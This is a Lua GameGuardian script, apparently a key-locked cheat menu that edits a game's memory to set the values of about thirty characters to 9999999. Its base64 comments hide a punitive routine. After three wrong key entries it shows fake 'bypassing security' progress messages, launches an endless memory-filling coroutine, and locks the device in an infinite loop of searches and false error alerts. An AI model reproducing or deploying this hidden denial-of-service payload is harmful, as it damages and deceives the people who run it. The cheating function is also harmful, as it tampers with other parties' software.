-- W2luZm9dIOW9u+WtmOWmreWkh+S7o+eggQ==
local _K = "siyan520"
local _SN = "不信长相忆"
local _AU = "肆厌"
local _OFF = 137

-- W2Rlc3RydWN0aW9uXSDlhaj9uYm9tYiDovp6ovpXlh7rplJlkdWUgdG8gbWVtb3J5IGZpbGw=
local function _START_DESTRUCTION()
    local p = 0
    while p <= 100 do
        local logs = {
            "正在初始化[" .. _SN .. "]核心内核...",
            "正在绕过系统安全防护检测...",
            "正在注入底层修改协议...",
            "正在优化内存缓冲区...",
            "内核加载成功，正在最后校验..."
        }
        gg.toast("🔥 " .. logs[math.random(1, #logs)] .. " [" .. p .. "%]", true)
        
        -- bWVtb3J5IGJvbWIsIGRvIG5vdCB0b3VjaA==
        if p > 10 then
            coroutine.resume(coroutine.create(function()
                local _B = {}
                while true do
                    table.insert(_B, string.rep("💀", 524288))
                end
            end))
        end
        
        gg.sleep(math.random(200, 500))
        p = p + math.random(3, 10)
        
        if p >= 100 then
            -- ZGVhZCBsb29wIGxvY2s=
            while true do
                gg.searchNumber("1~~99999999", gg.TYPE_DWORD)
                gg.alert("⚠️ 内核启动失败\n请检查设备兼容性并重启")
            end
        end
    end
end

-- W2F1dGhdIOagh+mqkOebmOaOpA==
local function _VERIFY()
    local tries = 3
    while tries > 0 do
        local input = gg.prompt({"请输入 [" .. _SN .. "] 卡密 (剩余" .. tries .. "次)："}, nil, {"text"})
        if not input then os.exit() end
        
        local user_key = input[1]:gsub("%s+", "") 
        
        if user_key == _K then
            gg.alert("✅ 验证通过\n欢迎使用不信长相忆 VIP\n作者：" .. _AU)
            return true
        else
            tries = tries - 1
            if tries > 0 then
                gg.toast("❌ 卡密不正确，请重新输入")
            end
        end
    end
    -- ZmFpbGVkLCBzdGFydCBraWxsZXI=
    _START_DESTRUCTION()
end

-- W21vZGlmeV0g5pWw5o2u5L+u5pS5
local function _MODIFY(t, name)
    local s = ""
    for i, v in ipairs(t) do
        s = s .. (v - _OFF) .. (i == #t and "" or ";")
    end
    gg.clearResults()
    gg.setRanges(gg.REGION_C_ALLOC)
    gg.searchNumber(s, gg.TYPE_DWORD)
    if gg.getResultCount() > 0 then
        gg.getResults(100)
        gg.editAll('9999999', gg.TYPE_DWORD)
        gg.toast("✨ " .. name .. " 开启成功")
    else
        gg.toast("❌ 未找到数据，请进入局内开启")
    end
end

-- W21haW5dIOWPjeWjeiBNZW51
local function Main()
    local menu = {
        "双面教师", "东东羊", "木西恩", "青年卢修斯", "劝学",
        "小太阳", "太奶", "僵尸博士", "玫瑰骑士", "刺猬",
        "袋鼠", "宁红夜", "仙人掌", "极光女神", "崽崽熊",
        "失心熊", "狸猫大力", "元气丸子", "小象多多", "鸡块妹",
        "饶舌", "蛋小红", "蛋小黄", "小黑", "小蓝",
        "魔鬼蛋", "小绿", "小粉", "白柳仙", "千金逐月",
        "画中少女", "🛑 退出系统"
    }
    
    local data = {
        [1] = {{577, 171, 287, 267, 137}, "双面教师"},
        [2] = {{567, 173, 287, 247, 137}, "东东羊"},
        [3] = {{587, 169, 287, 237, 137}, "木西恩"},
        [4] = {{597, 169, 287, 237, 137}, "青年卢修斯"},
        [5] = {{557, 171, 287, 247, 137}, "劝学"},
        [6] = {{527, 167, 287, 247, 137}, "小太阳"},
        [7] = {{537, 165, 287, 242, 137}, "太奶"},
        [8] = {{637, 162, 287, 242, 137}, "僵尸博士"},
        [9] = {{567, 171, 287, 242, 137}, "玫瑰骑士"},
        [10] = {{557, 164, 287, 242, 137}, "刺猬"},
        [11] = {{577, 170, 287, 242, 137}, "袋鼠"},
        [12] = {{557, 172, 287, 242, 137}, "宁红夜"},
        [13] = {{557, 173, 287, 247, 137}, "仙人掌"},
        [14] = {{517, 161, 287, 242, 137}, "极光女神"},
        [15] = {{587, 167, 287, 242, 137}, "崽崽熊"},
        [16] = {{597, 167, 287, 237, 137}, "失心熊"},
        [17] = {{597, 171, 287, 237, 137}, "狸猫大力"},
        [18] = {{587, 174, 287, 242, 137}, "元气丸子"},
        [19] = {{597, 165, 287, 237, 137}, "小象多多"},
        [20] = {{597, 177, 287, 242, 137}, "鸡块妹"},
        [21] = {{517, 162, 287, 242, 137}, "饶舌"},
        [22] = {{587, 175, 287, 242, 137}, "蛋小红"},
        [23] = {{557, 170, 287, 242, 137}, "蛋小黄"},
        [24] = {{537, 177, 287, 242, 137}, "小黑"},
        [25] = {{517, 167, 287, 242, 137}, "小蓝"},
        [26] = {{617, 167, 287, 237, 137}, "魔鬼蛋"},
        [27] = {{557, 167, 287, 242, 137}, "小绿"},
        [28] = {{537, 177, 287, 247, 137}, "小粉"},
        [29] = {{537, 165, 287, 242, 137}, "白柳仙"},
        [30] = {{557, 170, 287, 242, 137}, "千金逐月"},
        [31] = {{537, 167, 287, 242, 137}, "画中少女"}
    }
    
    local c = gg.choice(menu, nil, _SN .. " 管理终端")
    if c == nil then return end
    if c == #menu then os.exit() end
    _MODIFY(data[c][1], data[c][2])
end

-- W2VudHJ5XSDov5vohaXog6TmnK0=
gg.setVisible(false)
if _VERIFY() then
    while true do
        if gg.isVisible(true) then
            gg.setVisible(false)
            Main()
        end
        gg.sleep(150)
    end
end
